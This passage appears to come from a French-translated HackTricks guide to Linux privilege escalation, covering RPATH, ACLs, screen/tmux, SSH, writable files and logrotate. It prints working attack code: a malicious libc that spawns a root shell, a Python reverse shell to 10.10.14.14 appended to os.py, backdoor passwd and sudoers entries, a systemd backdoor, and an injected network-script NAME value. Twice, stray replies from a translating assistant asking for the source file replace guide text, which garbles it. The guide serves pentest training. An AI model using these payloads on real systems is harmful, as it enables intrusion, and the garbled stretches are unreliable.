echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Bibliothèque partagée

### ld.so

Le fichier `/etc/ld.so.conf` indique **d'où proviennent les fichiers de configuration chargés**. Typiquement, ce fichier contient le chemin suivant : `include /etc/ld.so.conf.d/*.conf`

Cela signifie que les fichiers de configuration dans `/etc/ld.so.conf.d/*.conf` seront lus. Ces fichiers de configuration **pointent vers d'autres dossiers** dans lesquels les **bibliothèques** seront **recherchées**. Par exemple, le contenu de `/etc/ld.so.conf.d/libc.conf` est `/usr/local/lib`. **Cela signifie que le système recherchera des bibliothèques dans `/usr/local/lib`**.

Si pour une raison quelconque **un utilisateur dispose de permissions d'écriture** sur l'un des chemins indiqués : `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, n'importe quel fichier à l'intérieur de `/etc/ld.so.conf.d/` ou n'importe quel dossier référencé par les fichiers de configuration dans `/etc/ld.so.conf.d/*.conf`, il peut réussir à obtenir une élévation de privilèges.\
Consultez **comment exploiter cette mauvaise configuration** dans la page suivante :


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
En copiant la lib dans `/var/tmp/flag15/` elle sera utilisée par le programme à cet emplacement comme spécifié dans la variable `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Ensuite, créez une bibliothèque malveillante dans `/var/tmp` avec `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capacités

Linux capabilities provide a **subset of the available root privileges to a process**. This effectively breaks up root **privileges into smaller and distinctive units**. Each of these units can then be independently granted to processes. This way the full set of privileges is reduced, decreasing the risks of exploitation.\
Lisez la page suivante pour **en apprendre davantage sur les capabilities et comment les abuser**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Permissions des répertoires

In a directory, the **bit for "execute"** implies that the user affected can "**cd**" into the folder.\
The **"read"** bit implies the user can **list** the **files**, and the **"write"** bit implies the user can **delete** and **create** new **files**.

## ACLs

Access Control Lists (ACLs) represent the secondary layer of discretionary permissions, capable of **overriding the traditional ugo/rwx permissions**. These permissions enhance control over file or directory access by allowing or denying rights to specific users who are not the owners or part of the group. This level of **granularity ensures more precise access management**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Donner** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Récupérer** les fichiers avec des ACLs spécifiques du système:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### ACL backdoor cachée dans les drop-ins sudoers

Une mauvaise configuration fréquente est un fichier appartenant à root dans `/etc/sudoers.d/` avec le mode `440` qui accorde néanmoins l'accès en écriture à un utilisateur peu privilégié via ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Si vous voyez quelque chose comme `user:alice:rw-`, l'utilisateur peut ajouter une règle sudo malgré les bits de mode restrictifs :
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Ceci est un chemin ACL persistence/privesc à fort impact car il est facile de le manquer lors d'examens basés uniquement sur `ls -l`.

## Sessions shell ouvertes

Dans les **anciennes versions** vous pouvez **hijack** une **session shell** d'un autre utilisateur (**root**).\
Dans les **nouvelles versions** vous pourrez **connect** uniquement aux sessions screen de **votre propre utilisateur**. Cependant, vous pourriez trouver **des informations intéressantes à l'intérieur de la session**.

### screen sessions hijacking

**Lister les sessions screen**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**Se connecter à une session**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

C'était un problème avec **old tmux versions**. Je n'ai pas pu détourner une session tmux (v2.1) créée par root en tant qu'utilisateur non privilégié.

**List tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Se connecter à une session**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Consultez **Valentine box from HTB** pour un exemple.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Toutes les clés SSL et SSH générées sur des systèmes basés sur Debian (Ubuntu, Kubuntu, etc) entre septembre 2006 et le 13 mai 2008 peuvent être affectées par ce bug.\
Ce bug se produit lors de la création d'une nouvelle clé ssh sur ces OS, car **seulement 32,768 variations étaient possibles**. Cela signifie que toutes les possibilités peuvent être calculées et **qu'en disposant de la clé publique ssh vous pouvez rechercher la clé privée correspondante**. Vous pouvez trouver les possibilités calculées ici : [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication :** Indique si l'authentification par mot de passe est autorisée. La valeur par défaut est `no`.
- **PubkeyAuthentication :** Indique si l'authentification par clé publique est autorisée. La valeur par défaut est `yes`.
- **PermitEmptyPasswords** : Lorsque l'authentification par mot de passe est autorisée, indique si le serveur permet la connexion aux comptes avec des mots de passe vides. La valeur par défaut est `no`.

### Login control files

Ces fichiers influencent qui peut se connecter et comment :

- **`/etc/nologin`** : s'il est présent, bloque les connexions non-root et affiche son message.
- **`/etc/securetty`** : restreint les endroits où root peut se connecter (liste d'autorisation des TTY).
- **`/etc/motd`** : bannière post-login (peut leak des détails sur l'environnement ou la maintenance).

### PermitRootLogin

Indique si root peut se connecter via ssh, la valeur par défaut est `no`. Valeurs possibles :

- `yes` : root peut se connecter avec mot de passe et clé privée
- `without-password` ou `prohibit-password` : root ne peut se connecter qu'avec une clé privée
- `forced-commands-only` : root peut se connecter uniquement avec une clé privée et si des options de commandes sont spécifiées
- `no` : non

### AuthorizedKeysFile

Spécifie les fichiers qui contiennent les clés publiques pouvant être utilisées pour l'authentification des utilisateurs. Il peut contenir des tokens comme `%h`, qui sera remplacé par le répertoire personnel. **Vous pouvez indiquer des chemins absolus** (commençant par `/`) ou **des chemins relatifs depuis le home de l'utilisateur**. Par exemple:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Cette configuration indiquera que si vous essayez de vous connecter avec la clé **private** de l'utilisateur "**testusername**", ssh va comparer la clé publique associée à votre clé avec celles situées dans `/home/testusername/.ssh/authorized_keys` et `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding vous permet de **use your local SSH keys instead of leaving keys** (without passphrases!) sur votre serveur. Ainsi, vous pourrez **jump** via ssh **to a host** et de là **jump to another** host **using** la **key** située dans votre **initial host**.

Vous devez définir cette option dans `$HOME/.ssh.config` comme ceci :
```
Host example.com
ForwardAgent yes
```
Remarquez que si `Host` est `*`, chaque fois que l'utilisateur se connecte à une machine différente, cet hôte pourra accéder aux clés (ce qui constitue un problème de sécurité).

Le fichier `/etc/ssh_config` peut **outrepasser** ces **options** et autoriser ou refuser cette configuration.\
Le fichier `/etc/sshd_config` peut **autoriser** ou **refuser** ssh-agent forwarding avec le mot-clé `AllowAgentForwarding` (par défaut autorisé).

Si vous trouvez que Forward Agent est configuré dans un environnement, lisez la page suivante car **vous pourriez en abuser pour obtenir une élévation de privilèges** :


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Fichiers intéressants

### Fichiers de profil

Le fichier `/etc/profile` et les fichiers sous `/etc/profile.d/` sont des **scripts qui sont exécutés lorsqu'un utilisateur lance un nouveau shell**. Par conséquent, si vous pouvez **écrire ou modifier n'importe lequel d'entre eux, vous pouvez obtenir une élévation de privilèges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Si un script de profil étrange est trouvé, vous devriez le vérifier pour **détails sensibles**.

### Fichiers passwd/shadow

Selon le système d'exploitation, les fichiers `/etc/passwd` et `/etc/shadow` peuvent porter un nom différent ou il peut exister une sauvegarde. Il est donc recommandé **de tous les trouver** et **de vérifier si vous pouvez les lire** pour voir **s'il y a des hashes** à l'intérieur des fichiers :
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Dans certains cas, vous pouvez trouver **password hashes** dans le fichier `/etc/passwd` (ou équivalent)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd inscriptible

Tout d'abord, générez un mot de passe avec l'une des commandes suivantes.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Je n’ai pas reçu le contenu de src/linux-hardening/privilege-escalation/README.md à traduire. Peux-tu fournir le texte du fichier ?

Précisions nécessaires :
- Souhaites-tu que je génère un mot de passe fort pour l’utilisateur `hacker` (par défaut 16 caractères avec majuscules, minuscules, chiffres et symboles) ?
- Où dois-je insérer la ligne ajoutant l’utilisateur et le mot de passe (à la fin du fichier, dans une section spécifique, etc.) ?
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Exemple : `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Vous pouvez maintenant utiliser la commande `su` avec `hacker:hacker`

Alternativement, vous pouvez utiliser les lignes suivantes pour ajouter un utilisateur factice sans mot de passe.\
ATTENTION : vous pourriez dégrader la sécurité actuelle de la machine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
REMARQUE : Sur les plateformes BSD, `/etc/passwd` se trouve à `/etc/pwd.db` et `/etc/master.passwd`, de plus `/etc/shadow` est renommé en `/etc/spwd.db`.

Vous devriez vérifier si vous pouvez **écrire dans certains fichiers sensibles**. Par exemple, pouvez-vous écrire dans un **fichier de configuration de service** ?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Par exemple, si la machine exécute un serveur **tomcat** et que vous pouvez **modifier le fichier de configuration du service Tomcat dans /etc/systemd/,** alors vous pouvez modifier les lignes :
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Votre backdoor sera exécuté la prochaine fois que tomcat sera démarré.

### Vérifier les répertoires

Les répertoires suivants peuvent contenir des backups ou des informations intéressantes : **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Probablement vous ne pourrez pas lire le dernier, mais essayez)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Emplacement inhabituel / fichiers Owned
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
Je n’ai pas reçu le contenu de src/linux-hardening/privilege-escalation/README.md. Peux-tu coller ici le contenu du fichier (markdown) ?  
Je le traduirai en français en conservant exactement la syntaxe markdown/HTML, les chemins, liens, tags et le code non traduits.
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Fichiers DB Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml fichiers
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Fichiers cachés
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries dans PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Fichiers Web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Sauvegardes**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Fichiers connus contenant des mots de passe

Lisez le code de [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), il recherche **plusieurs fichiers susceptibles de contenir des mots de passe**.\
**Un autre outil intéressant** que vous pouvez utiliser pour cela est : [**LaZagne**](https://github.com/AlessandroZ/LaZagne) qui est une application open source utilisée pour récupérer de nombreux mots de passe stockés sur un ordinateur local pour Windows, Linux & Mac.

### Journaux

Si vous pouvez lire les journaux, vous pourrez peut‑être y trouver des **informations intéressantes/confidentielles**. Plus le journal est étrange, plus il sera (probablement) intéressant.\
De plus, certains journaux d'audit mal configurés (backdoored?) peuvent vous permettre d'**enregistrer des mots de passe** dans les journaux d'audit comme expliqué dans ce post : [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Pour **lire les logs, le groupe** [**adm**](interesting-groups-linux-pe/index.html#adm-group) sera vraiment utile.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Vous devez aussi vérifier les fichiers contenant le mot "**password**" dans leur **nom** ou dans leur **contenu**, et également chercher des IPs et des emails dans les logs, ou des hashes regexps.\
Je ne vais pas détailler ici comment faire tout cela, mais si cela vous intéresse vous pouvez consulter les derniers checks que [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) effectue.

## Fichiers accessibles en écriture

### Python library hijacking

Si vous savez depuis **où** un script python va être exécuté et que vous **pouvez écrire dans** ce dossier ou que vous pouvez **modify python libraries**, vous pouvez modifier la bibliothèque OS et backdoor it (si vous pouvez écrire à l'endroit où le script python sera exécuté, copiez-collez la bibliothèque os.py).

Pour **backdoor the library** il suffit d'ajouter à la fin de la bibliothèque os.py la ligne suivante (change IP and PORT) :
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Exploitation de logrotate

Une vulnérabilité dans `logrotate` permet aux utilisateurs ayant des **permissions d'écriture** sur un fichier de log ou ses répertoires parents de potentiellement obtenir une élévation de privilèges. En effet, `logrotate`, souvent exécuté en tant que **root**, peut être manipulé pour exécuter des fichiers arbitraires, notamment dans des répertoires comme _**/etc/bash_completion.d/**_. Il est important de vérifier les permissions non seulement dans _/var/log_ mais aussi dans tout répertoire où la rotation des logs est appliquée.

> [!TIP]
> Cette vulnérabilité affecte `logrotate` version `3.18.0` et les versions antérieures

Plus d'informations détaillées sur la vulnérabilité sont disponibles ici : [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Vous pouvez exploiter cette vulnérabilité avec [**logrotten**](https://github.com/whotwagner/logrotten).

Cette vulnérabilité est très similaire à [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** donc chaque fois que vous découvrez que vous pouvez modifier des logs, vérifiez qui gère ces logs et voyez si vous pouvez escalader les privilèges en remplaçant les logs par des liens symboliques (symlinks).

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Référence de la vulnérabilité :** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Si, pour une raison quelconque, un utilisateur est capable d'**écrire** un script `ifcf-<whatever>` dans _/etc/sysconfig/network-scripts_ **ou** s'il peut **modifier** un existant, alors votre **système est compromis (pwned)**.

Les network scripts, _ifcg-eth0_ par exemple, sont utilisés pour les connexions réseau. Ils ressemblent exactement à des fichiers .INI. Cependant, ils sont \~sourced\~ sur Linux par Network Manager (dispatcher.d).

Dans mon cas, l'attribut `NAME=` dans ces network scripts n'est pas géré correctement. Si vous avez un espace blanc dans le nom, le système tente d'exécuter la partie après l'espace blanc. Cela signifie que **tout ce qui suit le premier espace est exécuté en tant que root**.

Par exemple : _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Remarque : l'espace entre Network et /bin/id_)

### **init, init.d, systemd et rc.d**

Le répertoire `/etc/init.d` contient des **scripts** pour System V init (SysVinit), le **système classique de gestion des services Linux**. Il inclut des scripts pour `start`, `stop`, `restart`, et parfois `reload` des services. Ceux-ci peuvent être exécutés directement ou via des liens symboliques présents dans `/etc/rc?.d/`. Un chemin alternatif sur les systèmes Redhat est `/etc/rc.d/init.d`.

D'autre part, `/etc/init` est associé à **Upstart**, un système plus récent de **gestion des services** introduit par Ubuntu, utilisant des fichiers de configuration pour les tâches de gestion des services. Malgré la transition vers Upstart, les scripts SysVinit sont toujours utilisés parallèlement aux configurations Upstart en raison d'une couche de compatibilité dans Upstart.

**systemd** apparaît comme un gestionnaire d'initialisation et de services moderne, offrant des fonctionnalités avancées comme le démarrage à la demande de daemons, la gestion des automounts et des snapshots de l'état système. Il organise les fichiers dans `/usr/lib/systemd/` pour les paquets de distribution et `/etc/systemd/system/` pour les modifications de l'administrateur, simplifiant ainsi l'administration système.

## Autres astuces

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Les frameworks de rooting Android hookent souvent un syscall pour exposer des fonctionnalités noyau privilégiées à un manager en userspace. Une authentification faible du manager (par ex. des contrôles de signature basés sur l'ordre des FD ou des schémas de mot de passe pauvres) peut permettre à une application locale d'usurper le manager et d'escalader en root sur des appareils déjà rootés. En savoir plus et détails d'exploitation ici :


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

La discovery de services basée sur des regex dans VMware Tools/Aria Operations peut extraire un chemin binaire depuis les lignes de commande des processus et l'exécuter avec -v dans un contexte privilégié. Des patterns permissifs (par ex. utilisant \S) peuvent matcher des listeners placés par un attaquant dans des emplacements inscriptibles (par ex. /tmp/httpd), conduisant à une exécution en tant que root (CWE-426 Untrusted Search Path).

En savoir plus et voir un pattern généralisé applicable à d'autres stacks de discovery/monitoring ici :

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Protections de sécurité du noyau

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Plus d'aide

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Meilleur outil pour rechercher des vecteurs d'escalade de privilèges locaux Linux :** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
